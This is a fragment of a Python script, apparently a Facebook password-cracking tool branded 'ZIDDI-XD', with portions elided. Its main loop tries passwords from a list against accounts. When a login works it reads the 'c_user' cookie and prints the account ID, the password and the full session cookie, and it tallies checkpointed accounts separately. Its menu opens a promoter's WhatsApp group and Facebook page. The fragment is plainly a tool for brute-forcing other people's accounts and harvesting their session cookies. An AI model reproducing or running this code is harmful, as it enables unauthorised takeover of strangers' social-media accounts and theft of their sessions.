...
logo = """\033[1;37m 
d88888D d888888b d8888b. d8888b. d888888b 
YP  d8'   `88'   88  `8D 88  `8D   `88'   
   d8'     88    88   88 88   88    88    
  d8'      88    88   88 88   88    88    
 d8' db   .88.   88  .8D 88  .8D   .88.   
d88888P Y888888P Y8888D' Y8888D' Y888888P 
--------------------------------------------------
[•]CREATER  :✓ ZIDDI BHATTI
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://chat.whatsapp.com/LvTcPUie6o2HZRvAr3qpRl')
	elif gh =='0':
...
def menu():
	os.system('xdg-open https://www.facebook.com/afaqhussan.afaqhussan.92?mibextid=ZbWKwL')
	print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ZIDDI-XD-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[ZIDDI-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mZIDDI-XD\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
